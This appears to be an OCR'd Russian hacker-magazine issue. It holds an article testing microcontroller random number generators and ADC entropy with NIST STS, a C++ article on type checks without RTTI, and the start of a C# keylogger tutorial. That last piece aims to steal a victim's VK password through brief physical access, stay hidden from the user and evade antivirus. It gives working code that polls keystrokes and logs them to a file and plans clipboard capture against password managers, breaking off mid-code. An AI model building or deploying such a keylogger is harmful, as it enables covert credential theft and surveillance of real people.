                       популярна (OEIS:A000796) и известны триллионы
                       ее знаков, использовать число π для практичес‐
                         ких применений в качестве ключа не стоит ни в
                       каком виде.


Пару слов об интерпретации результатов из отчета (experiments → Algo‐
rithmTesting → ﬁnalAnalysisReport.txt). В самом низу документа есть краткая
справка, и при первичном изучении пос ледова тельнос тей случайных чисел ее
бывает достаточно. Прог рамма сама помеча ет звездочкой проваленные тес‐
ты (критерии можно задавать в файле нас троек include → defs.h или исполь‐
зовать значения по умол чанию).
  Для более детального анализа желательно знать теорию вероятностей
и математическую статистику на базовом уровне, понимать, что такое
нулевая и альтернативная гипотезы, а также иметь пред ставление о раз‐
личных распределениях (можешь начать пря мо с документации, с. 13). Эта
информация особенно пригодится тебе, если ты захочешь соз дать собствен‐
ный генератор, так как поз волит выяснить, почему пос ледовательность
не проходит тесты в каждом конкрет ном случае.
   Чтобы понять, насколь ко успешно был пройден тот или иной тест, обра‐
щай внимание на критерий P‐value. Его смысл формулиру ется довольно ака‐
демично: «вероятность того, что идеальный ГСЧ сформировал бы пос ледова‐
тельность менее случайную отно ситель но заданной». Если коротко, то чем
ближе число к единице, тем лучше. И наоборот, значения около 0.1 сви‐
детельствуют о том, что мы были близки к провалу. Впрочем, даже результат
в диапазоне [0.4, 0.6] можно считать хорошим (при условии, что данных
для анализа было достаточно).
  Думаю, на этом можно наконец завершить знакомство с инс трументами
и перейти к основной теме статьи — тестированию наших генераторов.


АППАРАТНО == НАДЕЖНО?
Предлагаю начать со встроенного в микросхему F746NG TRNG‐генератора
и попытаться повторить результаты ST. К сло ву, некоторые аспекты проведен‐
ного ими тестирования лично у меня вызывают воп росы. Напомню, они ана‐
лизировали десять подпоследовательностей при мерно по 500 тысяч бит каж‐
дая (в сумме больше 5 миллионов бит).
   Во‐первых, авторы STS в своей работе пря мо указывают (на с. 91), что
для получения статистичес ки зна чимых результатов (чтобы была воз можность
их  дальнейшей  интерпретации)  нужно  выделять  и  анализировать
не менее 55 подпосле дова тельнос тей из общего пула энтропии. Во‐вторых,
можно ли получить достоверные зна чения при объ еме в 5 миллионов бит?
  Приведу простой пример: можно ли считать последовательность 01010
случайной? А последовательность 01010101010? Думаю, ты согласишься, что
во втором случае у нас гораздо больше оснований полагать, что мы имеем
дело с некоторым паттерном, как раз из‐за того, что мы увеличили объ ем
выборки для наших статистических тес тов.
   Если ты все еще сомневаешься, предлагаю рас смотреть другой пример —
хорошо известные функции rand и srand. На самом деле это неплохие фун‐
кции, если нужно, например, заменить игральный кубик в твоей любимой нас‐
толке. Наверное, излишне говорить о том, что они совершенно не подходят
для сколько‐нибудь серьезных применений, — ты и так об этом слышал.
Впрочем, слышать — одно дело, а проверить самостоятельно на практике —
совсем другое.
  Для наглядности на компь ютере с помощью этих функций был сфор‐
мирован файл с 1 миллиардом случайных бит. Так как было выбрано ASCII‐
представ ление нулей и единиц, каж дый бит потока занимал один байт в фай‐
ле (итого ровно гигабайт). Сначала в STS были проанализированы пер‐
вые 10 миллионов бит из этой пос ледова тельнос ти.





    Вывод первых тестов. На самом деле набор тестов гораз до больше

Интересный нюанс: функция rand воз вра щает целое чис ло со знаком, но в
стандарте языка нигде не оговорен диапа зон принимаемых значений (упо‐
минается, что дол жно быть не мень ше 16 бит). Мой компилятор (GCC) выдает
результат в диапазоне [0,  2147483647], то есть только положительную
половину из всех возможных. А отрицательные чис ла? Их нет.
  В результате старший 31‐й бит, который и хра нит в себе информацию
о знаке числа, оказывается всегда равным нулю. Если пытаться генерировать
энтропию таким способом, результат будет крайне детерминированным.
Поэтому даже в примере выше я использовал на каждой ите рации только
младшие 25 бит числа.
  Вернемся к результатам. Надеюсь, они тебя хотя бы чуть‐чуть удивили.
Действительно, судя по отчету, наша пос ледователь ность успешно прошла
через все тесты. Неужели все руга ют замеча тельную функцию rand совер‐
шенно напрасно? Предлагаю не спешить с вывода ми и проверить целиком
весь файл.


             INFO

                   Обработка больших массивов входных данных —
                       однозначно не самая сильная сторона STS. На i9‐
                     8950HK  прогон  полного  комплекта   тестов
                       для  последовательности  в  1  миллиард  бит
                      занимает больше часа. Это связано с тем, что все
                      вычисления в программе однопоточные. Так что,
                       если будешь повторять, запасись терпением.





  Если закономерность в пос ледова тельности все‐таки есть, она рано
  или поздно обязательно проявит себя

Тест FFT (Fast Fourier Transform, или быс трое преобразование Фурье) ищет
периодичности в распределении данных в нашем наборе (более детально
можешь ознакомиться на с. 68). Вполне естественно, что в такой при митив‐
ной реализации псевдослучайности период проявля ет себя гораз до раньше
полного  цикла (напом ню,  что  для 1 миллиарда  битов  потребовалось
взять 40 миллионов последовательных значений — это примерно 2% от всего
диапазона). Однако надо отдать должное функции rand: остальные тес ты (на
частоту, распре деле ние и подпоследовательнос ти) подвоха не заметили.
  Конечно, со всем этим мы несколько отклонились от основной темы,
но зато благодаря небольшому отступлению у нас теперь будут хорошие ори‐
ентиры и мы будем знать, с чем сравнивать резуль таты работы того или иного
генератора. Так что проверим боем TRNG, на этот раз для пос ледователь‐
ности в 1 миллиард бит. Код инициализации и работы с модулем на CMSIS
выглядит следующим обра зом:


#include <stm32f746xx.h> /* for CMSIS defines */


void rng_enable() {
    if (RNG ‐> CR & RNG_CR_RNGEN) {
        return; /* already enabled */
    }
    RCC ‐> AHB2ENR |= RCC_AHB2ENR_RNGEN; /* clock enable */
    RCC ‐> CR |= RNG_CR_RNGEN; /* rng on */
}


uint32_t rng_generate() {
    if (RNG ‐> SR & (RNG_SR_CECS | RNG_SR_SECS)) {
        return 0; /* seed error or clock error */
    }
    while (!(RNG ‐> SR & RNG_SR_DRDY)) {
        /* wait for data to appear */
    }
    return RNG ‐> DR;
}




                                     Продолжение статьи →
ТРЮКИ               ← НАЧАЛО СТАТЬИ
         В ПОИСКАХ
       СЛУЧАЙНОСТИ
        ИЩЕМ ЭНТРОПИЮ НА МИКРОСХЕМЕ, ЧТОБЫ
                ПОВЫСИТЬ СТОЙКОСТЬ ШИФРОВ




Аппаратные генераторы случайных чисел скоростью не отличаются, поэтому
микроконтроллер будет работать нес колько часов, прежде чем наберет дос‐
таточно энтропии. Зато и результаты соответс твующие.





  Кажется, скандального материала у меня не получится. Но ведь оно и к
  лучшему?


Под робнее об устрой стве TRNG
Если верить документации ST, TRNG — это генера тор кольцевого типа. В его
основе лежит джиттер — фазовое дрожание сигнала. Так как длительность
периода в цепочках инверторов не является идеальной (всегда чуть‐чуть раз‐
ная) и тесно связана с физическими характеристиками каждого элемента
на конкретной мик росхеме, последовательность на выходе впол не можно
считать случайной.



ТЕМНАЯ СТОРОНА АЦП
Если ты когда‐нибудь пытался провес ти точные изме рения аналоговой
величины и конвертировать ее в цифровой формат, то не мог не заметить, что
даже в идеальных условиях зна чение всег да дрей фует в районе какого‐либо
значения. Ничего удивительного, ведь сам АЦП не иде ален, да и преобра‐
зование из непрерывной функции в дискретную без потерь невозможно (в
общем случае). На эту тему у ST для раз работчиков припасен спе циальный
аппноут (PDF). Он помогает, во‐первых, смириться с неизбежным, во‐вторых,
минимизировать хотя бы часть шумов, которые ухудшают качество пре обра‐
зований.
  В данном случае шумы игра ют нам только на руку. Чем их больше, тем
менее предсказуемый результат получится на выходе и тем сложнее будет
выделить постоянную сос тавляющую. Но что выб рать в качес тве входного
сигнала (без него шумы в АЦП сами собой не появят ся)? На плате доступно
шесть аналоговых входов разъ ема  Arduino, одна ко  их использовать я
не рекомендую. Выводы нуж но экономить, да и есть вероятность, что кто‐то
подаст на него заранее извес тный сигнал и попытается испортить наш
генератор.
  К счастью, современные микроконтроллеры оснащены массой полезных
мелочей — почти как хороший швейцарский армейский нож. На борту у мик‐
росхемы F746NG — аналоговые датчики температуры и напряжения с регуля‐
тора 1,2 В. Помимо шес тнадцати внешних входов, у первого АЦП есть два
дополнительных канала для соответству ющих измерений. Всего же у нас
целых три АЦП и контакты А0 — А5 используются совместно с третьим. Все
это можно узнать из документации (PDF, с. 413) и исходников проекта STM32‐
duino. Таким образом, мы будем использовать ADC1, не мешая работе
остальной части программы.
  О датчиках стоит рассказать подробнее. Даже инженеры ST указывают
в даташите (PDF, с. 43 и 151), что точность измерений у них оставляет желать
лучшего и что они предназначены скорее «для качественного, нежели
количественного измерения характеристик». Конечно, есть возможность
улучшить точность, используя парамет ры заводской калибровки (для каждой
микросхемы они свои), но в целом картину это мало меняет. Прекрасно!


             INFO

                     Возможно, ты задумался, зачем на микрокон‐
                        троллере, который работает от 3,3 В, нужно нап‐
                      ряжение 1,2 В. На самом деле это напряжение
                       питания самого ядра (Cortex‐M7), а также памяти
                      (ОЗУ и ПЗУ). Это сде лано в первую очередь, что‐
                    бы снизить энергопотребление и тепловыделение
                       кристалла. С периферией ввода‐вывода эта часть
                      соединяется через преобразователи логических
                       уровней  (подобно  тому  как  схе мы  с  уров‐
                     нем 3,3 В иногда соединяют со старыми — с 5 В).



Наивный под ход
Теперь остается только написать функции инициализации АЦП и чтения соот‐
ветствующих значений. Это чуть сложнее, чем запустить TRNG: регистров тут
больше, несколько режимов работы, и вроде бы совершенно непонятно,
какие настройки указывать. Но пос ле вдумчивого чтения мануала почти все
вопросы должны исчезнуть. Единственный тонкий момент, который может
вызвать затрудне ния, — это как именно задать нужный канал для изме рений.
  Дело в том, что блоки АЦП на таких продвинутых микроконтроллерах рас‐
считаны на пакетную обра ботку данных. Предполагается, что ЦПУ занят
слишком важными вещами, чтобы отвлекать ся и ждать значения из АЦП. Пра‐
вильный сценарий по умолчанию заключается в том, чтобы по срабаты ванию
какого‐либо прерывания (например, от таймера) запустить сразу цепочку
преобразований на самых раз ных каналах из регистра SQRX. Параллельно
задействуется прямой дос туп (DMA), чтобы перебрасывать результат куда‐то
в память (где их потом заберет ЦПУ).
  Но это менее наглядно и в случае со всего дву мя каналами даже излишне.
Поэтому мы попытаемся сохранить понятный интерфейс вызовов Arduino,
используя при этом CMSIS для максимальной скорос ти.


#include <cstdint>
#include <stm32f746xx.h> /* for CMSIS defines */


enum channel_t {
  VREF = 17,
  TEMP = 18
};


void adc_init() {
  RCC ‐> APB2ENR |= RCC_APB2ENR_ADC1EN; /* enable clock */
  ADC1 ‐> CR2 |= ADC_CR2_ADON;          /* enable ADC */
  ADC1 ‐> SMPR1 |= ADC_SMPR1_SMP18_1 |  /* 28 cycles sample rate for
*/
                   ADC_SMPR1_SMP17_1;   /* temp & Vref channels
*/
  ADC ‐> CCR |= ADC_CCR_TSVREFE;        /* enable temp & Vref
sensors */
}


int16_t adc_read(channel_t ch) {
  ADC1 ‐> SQR3 = ch;                    /* set up new channel */
  ADC1 ‐> CR2 |= ADC_CR2_SWSTART;       /* software start */
  while (!(ADC1 ‐> SR & ADC_SR_EOC));   /* wait until data is ready
*/


  return ADC1 ‐> DR;
}

Обрати внимание, что используется двенадцатибитная точность измерений,
чтобы регистрировать даже небольшие шумы в сиг нале. Кроме того, на каж‐
дое преобразование отводится 28  тактов, хотя минимальное значение
для 12 бит составляет 15 тактов (можно най ти в мануале). От этого напрямую
зависит точность (чем медленнее — тем точнее) и количество преобразова‐
ний за единицу времени. Изна чально я предполагал, что лучше все го энтро‐
пию набирать при максимальной скорости, но опытным путем было выяснено,
что это не так и 28 тактов — оптимальное значение.
  Разумеется, полностью брать результат для наших нужд нельзя. Старшие
разряды вряд ли будут существенно менять ся, сколько бы мы ни пытались.
Более‐менее случайны как раз младшие биты нашего числа. Я беру наиме‐
нее предсказуемый правый бит. Таким образом, алгоритм очень простой:
поочередно читаем значения с датчиков температуры и напряжения и добав‐
ляем два бита в нашу выходную пос ледовательность. Что же, что же получится
в результате?





                           Катас трофа!

Это было непросто, но сгенерированная мной последовательность ока‐
залась даже хуже той, которую выдала стандартная функция rand. Неужели я
зря потратил свое (и твое) время?


По пытка номер два
На самом деле это показа тельный при мер того, что к генерации случайных
чисел нужно относиться серь езно. Примитивные методы никогда не дадут
хорошего результата и вряд ли оста новят настой чивого иссле дователя. Выше
я допустил несколь ко базовых ошибок, и придет ся их исправить.
   Во‐первых, наш метод может быть сколь угодно случайным, но это еще не
означает, что распределение в нем равномерное. Классический пример —
«неправильная» монетка, вероятность выпадения орла на которой больше 0,5
(скажем, 0,9). Очевидно, что в серии бросков орлов будет гораздо больше,
чем решек, но при этом гарантированно уга дать каждый следующий резуль‐
тат все еще невозможно.
   Аналогично обстоит дело и с АЦП. В идеальной ситуации в выходной пос‐
ледовательности дол жно быть пример но поровну нулей и единиц. Чтобы это‐
го добиться, можно использовать алго ритм фильтрации фон Ней мана. Если
коротко, то в каждой паре битов во входном потоке мы сравниваем оба зна‐
чения между собой и используем только первый или второй бит в парах
с переходом (вида 01 или 10). При этом пары не накладываются друг на дру‐
га, а следуют одна за дру гой.
   Второй момент заключается в том, чтобы эффективно смешивать оба
наших источника энтропии. То есть нужна такая функция, которая меняла бы
свой результат при изменении одного из аргументов. Из самых распростра‐
ненных операций в этом плане наибо лее показательна, конечно же, функция
исключающе го ИЛИ (XOR).
  Подробней обо всем этом (а также о многом другом) ты можешь про‐
читать в RFC 4086. Несмотря на то что это довольно старый документ, в нем
доступно изложены базовые концепции и он по‐преж нему акту ален. Как пра‐
вило, выход с аппаратного генера тора почти всег да рекомендуется фильтро‐
вать перед обработкой (в англо язычной литера туре употребляется термин
whitening — побелка). Существу ют и дру гие алгоритмы, но, учитывая скром‐
ные ресурсы микроконтроллеров, в пер вую очередь желательно пробовать
именно те, что я описал.
  К сожалению, помимо очевидных плюсов,  у такой фильтрации есть
и существенный минус. Нетрудно заметить, что на каждом этапе выходной
поток оказывается значитель но короче входного. И если XOR урезает поток
«всего» вдвое, то при фиксированной выходной длине алгоритм фон Ней‐
мана требует, вооб ще говоря, неопределен ного количества входных битов
(обычно этот коэффициент сос тавляет от четырех до шести, для источника
энтропии среднего качес тва). Так что, если тебе вдруг придется генери‐
ровать таким способом какой‐нибудь ключ, точное  затраченное время
не скажет никто (ну разве что Хакану бис).
  С учетом всех допол нений код принимает такой вид:


#include "ff.h" /* for disk IO */
#define LEN       (100)


static UINT temp;


float app_process() {
  static uint32_t count = 0;
  char buffer[LEN + 1];


  for (uint32_t i = 0; i < LEN; ++i) { /* create a line of random
bits */
    int32_t v1, v2, t1, t2;


    v1 = adc_read(VREF);
    t1 = adc_read(TEMP);
    v2 = adc_read(VREF);
    t2 = adc_read(TEMP);


    v1 = (v1 ^ t1) & 0x01;
    v2 = (v2 ^ t2) & 0x01;


    v1 != v2 ? buffer[i] = char(v1 + '0') : ‐‐i; /* if not success,
repeat */
  }


  f_write(file, buffer, sizeof(buffer), &temp);
  count++;
}

Наконец, после дол гого ожидания, накопления и проверки энтропии резуль‐
тат тестов выглядит сле дующим обра зом.





         Неплохая попытка, но до TRNG все‐таки не дотягивает


ЗАКЛЮЧЕНИЕ
Конечно же, генерировать весь пул энтро пии средствами АЦП вряд ли
целесообразно (разве что у тебя в запасе целая куча времени). А вот проини‐
циализировать начальным значением программный генератор впол не разум‐
но. Кроме того, если у тебя есть сомнения относительно твоего текущего
ГСЧ, подмешивание второго потока может при дать дополнительной уве рен‐
ности.





Если тебя заинтересовала тема аппа рат ной генерации случайных чисел,
рекомендую  заглянуть  в  «Искусство  схемотехники»  (Хоровиц,  Хилл).
В девятой главе есть подробное описание некоторых любопытных схем. Там
же можно прочитать про структуру и прин цип дей ствия АЦП. Правда, матери‐
ал не самый простой и требует зна ния как аналоговой, так и цифровой элек‐
троники. Но оно того стоит!
КОДИНГ

 МАГИЯ C++





    КАК ВЫЖИТЬ БЕЗ ДИНАМИЧЕСКОЙ
       ИДЕНТИФИКАЦИИ ТИПОВ
         И НЕ СОЙТИ С УМА





В  C++   существует   такое   понятие,
как динамичес кая идентификация типа дан‐
ных (RTTI). Это механизм, который позволя‐
ет определить тип переменной или объекта
на этапе выполнения программы. Одна ко,        Владимир Керимов                                                                           Ведущий C++ разработчик в
чтобы   уменьшить   размер  собранных           qualab@gmail.comкомпании Mail.ru
бинарей, во многих про ектах RTTI отклю‐
чают, и от этого перестают работать dynam‐
ic_cast и  typeid. Но способ про верить,
порожден ли инстанс объекта от какого‐то
базового клас са, все же есть, и в своей
статье я покажу, как сделать это элегантно.


Отключение RTTI приводит к тому, что для верификации начинают делать раз‐
ные странные вещи — например, заводят целочисленные class_id и проверя‐
ют их вручную, бегая глазами по иерархии клас сов. Мы же используем магию
шаблонов и полиморфизм, что бы обойтись без этого. Это поможет умень‐
шить количество бредокода, а также упростит приведе ние к нужному типу.
   Традиционно C++ считается надеж ным инс трументом построения API
с проверкой типов еще на эта пе компиляции. Исклю чения составля ют шаб‐
лоны и ссылки на базовый  тип, которые дают относительную свободу
в выборе типа. Как правило, когда проект раз раста ется, стараются экономить
каждый мегабайт получа ющихся бинарников и в первую очередь под нож
идет система RTTI.
  С одной стороны, конечно, RTTI дает воз можность делать dynamic_cast
вверх по иерархии наследова ния, а также узнавать идентификатор типа
по typeid, но, с другой стороны, кто и когда этим пользуется? Как правило, dy‐
namic_cast без проб лем заменяется  static_cast  (если библиотека C++
не содержит действительно вет вистое дерево наследования).
  Бывает, конечно, что наследова ние в C++ не сво дится к наличию баналь‐
ного базового интерфейса IClassName и наследова нию ClassName в недрах
библиотеки. Вместо этого может быть представлена полноценная иерархия
типов. Тогда без RTTI будет сложно обойтись, просто потому, что мы не смо‐
жем взять и проверить тип на инстанцирование опре деленного типа иерар‐
хии через провер ку dynamic_cast.


void somefunc(base* b) {
    if (derived* d = dynamic_cast<derived*>(b))

Как правило, либо есть стоп роцентная уверенность, что это инстанс опре‐
деленного класса (которая в половине случаев в итоге оказывается далеко
не стопроцентной), либо инстанс типа проверяется на некий уникальный
CLASS_ID, переданный при создании экземпляра класса. А это, разумеется,
крайне дырявый способ про верить инстанцирова ние класса, ведь нас ледни‐
ки будут иметь свой уникальный CLASS_ID. Поэтому такая проверка возможна
не столько на импле ментацию клас са, сколько на соответствие ровно одному
типу. Все это выливается в целые цепочки про верок вида


void somefunc(const creature& c) {
    if (c.class_id() == animal::CLASS_ID) ...
    if (c.class_id() == cow::CLASS_ID) ...

Однако идея, в общем‐то, неплоха, давай толь ко сделаем проверку проще
и эффективнее. Пусть у нас будет воз можность проверить любые два клас са
иерархии на наследование, а любой инстанс класса этой иерархии —
на имплементацию определен ного клас са.


ДЕЛАЕМ ПРОВЕРКУ УДОБНЕЕ
Помогут нам в этом шаблоны и полиморфизм. Если у нас все го два класса,
то, кроме шаблона, нам ничего не нужно.
   Итак, дано дерево наследования, пусть каждый класс X однозначно иден‐
тифицируется по методу X::id(), а также задан typedef для базового клас са,
поименованный как X::base для каждого класса иерархии.


class B : public A {
public:
    typedef A base;
    static someunique id();

В этом случае шаблон is_class<X>::of<Y>() будет дос таточно прос тым:
нужна проверка на соответствие X::id() или непосредственно Y::id(),
либо X — один из наследников Y, и, рекурсивно обходя пред ков, мы найдем
соответствие.


template <typename X>
struct is_class {
    template <typename Y>
    static bool of() { return X::id() == Y::id() ||
                       is_class<X::base>::of<Y>(); }

Теперь осталось только обеспечить корректный выход из рекурсии в базовом
классе. Для коррек тного обхода классов иерархии нам нужно, чтобы базовый
класс завершал поиск предка.


template <>
struct is_class<root> {
    template <typename Y>
    static bool of() { return root::id() == Y::id(); }

Теперь если есть иерархия creature => animal => cat и animal => dog,
то можно спокойно про верять любые клас сы на наследование друг от дру га.


template <typename X>
void meet(X&& x) {
    if (is_class<X>::of<dog>())
        feed(std::forward<dog>(x));


ПОЛИМОРФИЗМ ВМЕСТО RTTI
С проверкой объекта на инстанцирование клас са иерархии будет сложнее.
Нам понадобится специальный вир туаль ный метод who(), который в каждом
классе возвращает свой ста тический уникальный id().


class B : public A {
public:
    typedef A base;
    static someunique id();
    virtual someunique who() const { return id(); }

Также было бы удоб но у любого инстанса иерархии спрашивать, инстанциру‐
ет ли он один из ее классов. Для это го в корневом классе иерархии заведем
метод is<X>(), который будет шаблонным, а зна чит, несколько поломает нам
полиморфизм при про верке. Для выхода из ситуации заведем еще один
вспомогательный метод is_base_id, перегруженный от типа, которым опре‐
деляется уникальность класса в методе id().


class root {
public:
    template <typename X>
    bool is() const { return is_base_id(X::id()); }


    virtual bool is_base_id(const someunique& base_id) const {
        return base_id == id();
    }

У наследников метод is_base_id должен переопределяться аналогично про‐
верке is_class<X>::of<Y> с исполь зованием проверки базового класса
на соответствие id().


class B : public A {
public:
    typedef A base;
    static someunique id();
    virtual someunique who() const { return id(); }


    virtual bool is_base_id(const someunique& base_id) const {
        return base_id == id() ||
               base::is_base_id(base_id);
    }

Таким образом, каждый класс иерархии можно будет проверить на инстан‐
цирование любого ее клас са и безопасно приводить тип по ссыл ке в соот‐
ветствии с иерар хией.


void somefunc(const creature& c) {
    if (c.is<animal>()) {
        const animal& a = static_cast<const animal&>(c);

Поскольку после проверки на инстанцирова ние чаще всего идет именно при‐
ведение типа (обыч но для это го проверка и нужна), то удобно также в кор‐
невом классе сделать еще один метод as<X>(), который инкапсулирует про‐
верку is<X>() и статичес кое преобра зова ние типа.


class root {
public:
    template <typename X> const X& as() const;
    template <typename X> X& as();

Разумеется, это удоб но делать, только если вместе с RTTI в проекте
не отключены еще и исклю чения. Иначе будет сложно кинуть исключение
в том случае, если, например, некий объект x типа animal не инстанциру ет
тип cat, а его просят x.as<cat>().say_meow(). ;)


УМЕТЬ ГОТОВИТЬ C++
Язык C++ очень гибкий и мощ ный, а если немножко уделять внимание
деталям, то и удоб ный. Мы получили высоко уровневые способы удоб ной про‐
верки наследования классов и инстанцирования от них объ ектов. Накладные
расходы при этом не так страшны.
 • Наследуемый класс должен определять предка через typedef с тем же
  именем, например base.
 • Каждый класс иерархии должен уметь идентифицировать себя методом
  id() . Тип идентифика тора я рас смот рю ниже, но он непринципиален,
   это может быть просто int.
 • Корневой класс иерархии должен завершать рекурсивный обход вверх
   по иерархии, что весьма логично.
 • Каждый класс иерархии должен уметь проверить произвольный id()
   на соответствие либо своему id() , либо id() одного из своих предков —
   для проверки инстанцирования клас са.

Также для удобства были введены методы who(), is<X>() и as<X>()
в базовом классе.
   Единственный минус этой схемы — обязатель ное объявле ние base,
is_base_id(), id() и who() в каждом клас се иерархии. Для удобства можно
завернуть все в макрос с аргументом базового типа, делающий однотипные
объявления.
   Теперь внутри иерархии клас сов мы можем:
 • проверять, является ли класс X наследником дру гого класса Y , конс трук‐
   цией is_class<X>::of<Y>() ;
 • проверять, инстанциру ет ли объект z класс W методом z.is<W>() .

Бонусом мы  получили  рантайм‐информа цию об  идентификаторе  типа
методом who(). Если идентификатор поддерживает человекочитаемый фор‐
мат, это может быть полезно для логирования и отладки.
  Другим бонусом может  стать безопасное приведение  типов  вверх
по иерархии вспомогательным методом as<X>(), даже если исключения
отключены. Просто в этом случае придет ся воз вра щать указатель и проверять
его в лучших традициях пещерных предков, писавших на чистом C.


УНИКАЛЬНЫЙ ИДЕНТИФИКАТОР КЛАССА
Осталось разобраться, как идентифицировать класс. На самом деле подой‐
дет абсолютно любой тип, поддерживающий сравнение. Имеет смысл соз‐
давать константу с идентифика тором в первый вызов метода id() каждого
класса.
   Будет полезно, если при этом по id() окажется возможным будет понять,
чей это идентификатор, то есть не лишним будет имя типа. Также важно
понимать, что тело метода должно находиться не в заголовочном файле,
а идентификатор дол жен единожды экспортировать уникальную сгенери‐
рованную констан ту.
   Рассмотрим пример такого типа, по которому можно идентифицировать
наследование любого клас са иерархии.


class class_id {
public:
    class_id(const char* const name)
        : m_name(name), m_index(generate_unique()) {
    }
    const char* const name() const { return m_name; }
    int index() const { return m_index; }
    bool operator == (const class_id& another) const {
        return m_index == another.m_index;
    }
private:
    const char* const m_name;
    int m_index;
};

Если мы используем int, то его дос таточно просто потокобезопас но инкре‐
ментить для генерации уникальных значений и получить миллиарды раз ных
типов. Выходит, что class_id в целом необя зателен, но узнать у объ екта
иерархии z его z.who().name() бывает очень и очень полезно.
  В методе id() каждого клас са нам в помощь static‐константа с нужным
именем.


const class_id& cat::id() {
    static const class_id cat_id("cat");
    return cat_id;
}

Таким образом, все объявления методов id() и who() сведутся к объявле‐
ниям вида


class creature {
public:
    static const class_id& id();
    virtual const class_id& who() const { return id(); }

Подчеркну, что генерация уникальных констант не должна инлайниться, а дол‐
жна экспортироваться из единс твенного мес та, где создан ровно один
экземпляр данного типа для каждого класса иерархии, включая инстансы
шаблонов.


БЕЗОПАСНОСТЬ — В УДОБСТВЕ
В очередной раз можно убедиться, что чем удобнее мы делаем для себя
окружение разработки, тем безопаснее получается код и тем проще его под‐
держивать. Вместо грозящего нам леса проверок на идентификаторы в каж‐
дом втором методе мы автоматизиро вали проверку обхода всей иерархии
до самого ее кор ня и запако вали в удоб ные читаемые методы.
  Слабое место такого подхода — принуди тельное инстанцирование шаб‐
лонов наследников. Также этот метод не получит ся применять для проверки
более одного предка, но можно добавить необходимые модификации.
  В общем, мой совет — не мириться с вещами, которые вызывают слож‐
ности в поддержке кода — тво его или унаследованного. Прос тейшее объ‐
явление одного‐единственного макроса в теле клас са и объ явление по одно‐
му методу аналогичного id() для класса решит любые проблемы с рекур‐
сивной проверкой наследова ния и инстанцирования классов иерархии.


        WWW

                    •Исходники на GitHub
КОДИНГ





                                                                                     Hackcat
                                                                                        hackcat.dev@gmail.com
   КЕЙЛОГГЕР
     ПО-ДОМАШНЕМУ

           ПИШЕМ НА C# КЕЙЛОГГЕР,
   КОТОРЫЙ НЕ ПАЛИТСЯ АНТИВИРУСАМИ





Боевые кейлоггеры с кучей фун кций и защитой от детекта
могут стоить десятки, если не сотни долларов. Но кейлоггер
не такая уж сложная штука, и при желании ты можешь сде‐
лать собственный и даже избежать детекта антивирусами.
В этой статье я покажу, как это дела ется, а заодно поуп‐
ражняемся в разработке программ на C#.


СТАВИМ ЗАДАЧУ
Мудрить не будем и ограничимся необходимым минимумом. Предположим,
мы хотим заполучить пароль жертвы от ВК и мы можем ненадол го получить
физический доступ к компьютеру. При этом:
 • мы не беспокоим жертву лиш ними окнами, иконками в таскбаре, сооб‐
  щениями об ошибках и подобным;
 • мы имеем доступ к целевому компь ютеру толь ко однократно и на очень
   короткий срок;
 • мы сможем забирать логи, находясь в той же локальной сети;
 • антивирус должен мол чать;
 • файрвол не учитыва ем и предполага ем, что мы дадим ему разрешение
   вручную при подсадке кейлоггера;
 • мы не будем пытаться скрывать процесс и толь ко дадим ему неприметное
   название.

Еще жертва может поль зоваться парольным менеджером, тогда в логе мы
получим только Ctrl‐C и Ctrl‐V. На этот случай будем мониторить еще и содер‐
жимое буфера обмена.


             INFO

                     Подробнее об атаках на парольные менеджеры
                        читай в статье «Ищем слабые места сов ременных
                     менед жеров паролей».


Писать будем на C# в Visual Studio. Забегая вперед, скажу, что в результате
у меня получилось две версии программы — одна работает через перехват
WinAPI, другую я про себя называю «кос тыльной». Но эта менее красивая вер‐
сия дает другие результаты при проверке анти виру сами, поэтому расскажу
и о ней.


ТЕОРИЯ
Когда ты нажимаешь на кнопку, операционка посылает уведомления тем
программам, которые хотят об этом узнать. Поэтому самый простой способ
перехватить ввод с клавиатуры — это принимать сообщения о нажатиях кла‐
виш. Если мы этого сделать не можем (например, функция SetWindowsHookEx
запрещена антивирусом или еще чем‐либо), можно тянуть сырой ввод и без
нее. Есть такая функция — GetAsyncKeyState, которая принимает номер кла‐
виши и позволяет узнать, зажата она или отжата в момент вызова. Собствен‐
но, алгоритм действий будет такой: раз в N мс опрашиваем все кнопки
и узнаем их состояние, занося нажатые в специаль ный список. Затем список
обрабатываем, учитывая сос тояние клавиши Caps Lock, Num Lock, Shift, Ctrl
и так далее. Полученные данные будем записывать в файл.


ПИШЕМ КОД
Для начала откроем Visual Studio и соз дадим новый проект Windows Forms
(.NET Framework). Почему именно Windows Forms? Если мы выберем обычное
консольное приложение, то при каждом запус ке будет создаваться нек‐
расивое черное окошко, а ведь юзера мы договорились не беспокоить. Так‐
же, пока мы не создали форму (а соз давать ее мы и не будем), никаких знач‐
ков в таскбаре не появится — важная часть скрытой работы. Теперь удаляй
автоматически созданный файл Form1.cs со всеми потрохами и откры вай
Program.cs.





                            Заг лушка Main

Здесь нас уже поджида ет шаблон программы, но он не будет работать прос‐
то так. Первым делом надо убрать строчки 10–12 и 16–18. Теперь меняем
объявление метода со static  void  Main() на static  void  Main(
String[] args). Нужно это для того, чтобы мы могли определить свои аргу‐
менты при перезапуске.
   Теперь добавим using System.IO; для работы с файлами, System.Run‐
time.InteropServices для работы с WinAPI и System.Threading для при‐
остановки потока. Если ты не хочешь писать кос тыль ный вариант, лучше про‐
пусти этот раздел и сразу переходи к следующему.
  Импортируем GetAsyncKeyState из user32.dll:


[DllImport("user32.dll")]
public static extern int GetAsyncKeyState(Int32 i);

И добавляем собственно логирование нажатий, собирая их по десять штук,
чтобы не делать слишком много дисковых операций:


while (true)
{
   Thread.Sleep(100);
   for (int i = 0; i < 255; i++)
   {
      int state = GetAsyncKeyState(i);
      if (state != 0)
      {
        buf += ((Keys)i).ToString();
        if (buf.Length > 10)
        {
           File.AppendAllText("keylogger.log", buf);
           buf = "";
        }
      }
   }
}





              Расшифровывать такой лог будет неудоб но

Выглядит не очень красиво, а про читабельность вообще можно забыть.
Во‐первых, наш код тянет ввод не толь ко с кла виату ры, но и с мыши (всякие
LButton и RButton). Поэтому давай не будем записы вать нажатие, если это не
символьная клавиша. Заменим содержимое if в цикле на это:


// Усовершенствованная проверка введенных символов //
if (((Keys)i) == Keys.Space) { buf += " "; continue; }
if (((Keys)i) == Keys.Enter) { buf += "\r\n"; continue; }
if (((Keys)i) == Keys.LButton ||((Keys)i) == Keys.RButton ||((Keys)i)
 == Keys.MButton) continue;
if (((Keys)i).ToString().Length == 1)
{
     buf += ((Keys)i).ToString();
}
else
{
     buf += $"<{((Keys)i).ToString()}>";
}
if (buf.Length > 10)
